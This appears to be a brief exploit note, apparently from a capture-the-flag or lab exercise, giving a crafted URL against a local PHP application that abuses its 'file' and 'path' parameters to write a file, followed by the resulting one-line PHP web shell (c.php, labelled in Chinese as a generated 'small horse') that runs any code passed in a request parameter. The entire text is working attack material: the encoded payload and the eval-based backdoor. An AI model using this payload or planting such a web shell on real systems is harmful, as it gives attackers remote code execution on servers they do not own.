Payload : 
```
http://127.0.0.1/?file=http://127.0.0.1/?file%3dhttp%3a%2f%2f127.0.0.1%2f%26path%3d%253C%3fphp%2520eval(%24_REQUEST%5bc%5d)%3b%3f%253E.php&path=c.php
```
生成小马(c.php) : 
```
<?php eval($_REQUEST[c]);?>
```
